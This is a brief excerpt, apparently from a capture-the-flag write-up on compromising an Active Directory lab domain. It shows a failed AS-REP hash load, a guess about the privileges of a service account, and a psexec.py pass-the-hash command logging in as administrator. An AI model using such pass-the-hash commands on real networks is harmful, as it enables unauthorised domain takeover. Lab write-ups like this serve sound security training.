...
Hashfile 'fsmith_asrep.hash' on line 1 (@EGOTI...[REDACTED]): Separator unmatched  
No hashes loaded.
```
...
"svc_loanmgr" makes us think that this user is a loan manager, which makes him higher placed as fsmith in the hierarchy of the bank and as such, might have access to more sensirtive data, however this is just hypothesis. The `svc` in his username is more telling.
...
```PowerShell
> psexec.py 'EGOTISTICAL-BANK.LOCAL/administrator@10.129.95.180' -hashes ':[REDACTED]'  
